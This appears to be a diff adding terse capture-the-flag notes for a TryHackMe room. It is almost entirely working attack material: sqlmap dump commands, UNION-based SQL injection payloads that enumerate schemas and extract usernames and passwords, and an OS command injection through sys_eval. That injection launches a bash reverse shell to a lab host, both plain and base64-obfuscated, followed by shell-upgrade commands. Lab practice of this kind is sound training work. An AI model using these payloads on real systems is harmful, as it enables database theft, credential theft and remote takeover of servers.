@@ -1,0 +1,84 @@
+TryHack3M: Sch3Ma D3Mon
+https://tryhackme.com/r/room/sch3mad3mon
+
+http.request.method == "POST"
+
+sqlmap -r req.txt --dbs
+
+sqlmap -r req.txt -D mayh3Mmarketplace --dump-all
+
+Find table names all databases
+
+' UNION SELECT 1,2,  table_schema, table_name, 1 FROM information_schema.tables -- //
+
+Find table names for just tables application running
+
+' UNION SELECT 1,2,table_name, column_name, 1 FROM information_schema.columns where table_schema=database() -- //
+
+Find column names:
+
+' UNION SELECT 1,2,table_name, column_name, 1 FROM information_schema.columns -- //
+
+' UNION SELECT 1,2,3,4,product_name FROM unlisted_products -- //
+
+' UNION SELECT 1,price,description,product_type,product_name FROM unlisted_products -- //
+
+
+2	sqlitraining	products	1
+2	sqlitraining	users	1
+2	mayh3Mmarketplace	unlisted_products	1
+2	mayh3Mmarketplace	transactions	1
+2	mayh3Mmarketplace	users	1
+2	mayh3Mmarketplace	leaderboard_stats	1
+2	mayh3Mmarketplace	room_stats	1
+2	mayh3Mmarketplace	streak_stats	1
+2	mayh3Mmarketplace	member_stats	1
+2	mayh3Mmarketplace	easter_egg	1
+2	mayh3Mmarketplace	products	1
+2	performance_schema	innodb_redo_log_files	1
+
+
+
+transactions
+
+' UNION SELECT purchase_timestamp,transaction_number, bcoin_sender_address,bcoin_recipient_address, transaction_ammount FROM transactions -- //
+users
+
+' UNION SELECT 1,id,username, password, description FROM users -- //
+
+leaderboard_stats
+
+' UNION SELECT 1,2,position, username, points FROM leaderboard_stats -- //
+
+room_stats
+
+' UNION SELECT 1,2,position, username, rooms_completed FROM room_stats -- //
+
+streak_stats
+
+' UNION SELECT 1,2,position, username, streak FROM streak_stats -- //
+
+member_stats
+
+' UNION SELECT 1,2,position, username, join_date FROM member_stats -- //
+
+easter_egg
+
+' UNION SELECT 1,2,3,url_path,message FROM easter_egg -- //
+
+products
+
+' UNION SELECT id,product_name,product_type, description, price FROM products -- //
+
+==
+
+http://10.10.182.236:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,null,null,null,%20sys_eval(%27whoami%27)%20--%20//
+
+sh -i >& /dev/tcp/10.10.206.17/9001 0>&1
+
+10.10.182.236:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,null,null,null,%20sys_eval(%27echo%20c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMjA2LjE3LzkwMDEgMD4mMQ==%20|%20base64%20-d%20|%20/bin/bash%27)%20--%20//
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo; fg
